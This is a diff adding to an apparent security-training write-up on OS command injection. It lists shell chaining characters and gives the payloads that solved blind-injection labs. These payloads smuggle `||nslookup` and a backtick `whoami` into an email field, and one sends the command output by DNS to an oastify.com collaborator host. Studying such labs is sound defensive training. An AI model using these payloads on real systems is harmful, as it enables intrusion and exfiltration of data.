@@ -85,6 +85,40 @@ We can inject command that will tirgger an out of bound network interaction
 & nslookup 0xthem7.xyz &
 ```
 
+
+## Ways of injecting OS commands
+
+Characters used for both unix based system and windows which can be chained together.
+
+
+```
+&
+&&
+|
+||
+```
+Commands for unix based system only
+
+```
+;
+```
+```
+Newline (0x0a or \n) 
+```
+
+To perform inline command injection the following characters can be used.
+
+```
+`
+```
+
+```
+$
+```
+
+Sometimes the output comes with `"` or `'` which could block the attack in this situation you may need to use the [meta characters](https://en.wikipedia.org/wiki/Metacharacter) according to the shell.
+
+
 # Labs
 ## Lab: OS command injection, simple case
 
@@ -171,3 +205,31 @@ csrf=2g6DRob8aEXHozDiwXDVj2UERt46YtmP&name=Coolcool&email=x||whoami+>+/var/www/i
 The we fetched the output over 
 
 https://YOURINSTANCE//image?filename=0xtheM7.txt
+
+
+## Lab: Blind OS command injection with out-of-band interaction
+
+Payload used to solve the lab 
+
+
+```
+csrf=vGk1Dn16qDq6NL7e0FV7fWmNmPOLMzFX&name=Himansu&email=x||nslookup+ld2qv0chx7z7doolkvdjryla117svij7.oastify.com||&subject=Cool&message=Cool
+```
+
+In this we have used the same bypass mechanism however we used internal command `nslookup` so that we can find out it it's hitting out server or not. 
+
+## Lab: Blind OS command injection with out-of-band data exfiltration 
+Payload used to solve the lab 
+
+
+```
+csrf=rcLcNvCAFojt490aCvcJ520UERrBXVly&name=Coool&email=x||nslookup+`whoami`.q3uvl52mncpc3teqa03oh3bfr6xxlq9f.oastify.com||&subject=Cool&message=Cool
+```
+
+Here we ran command ```whoami``` using backtick ``` `whoami` ``` which is used to run inline command and thus complete DNS query become 
+
+```
+{outputOfWhoami}.q3uvl52mncpc3teqa03oh3bfr6xxlq9f.oastify.com
+```
+
+And under the collaborator we could find the username which eventually solved the lab.
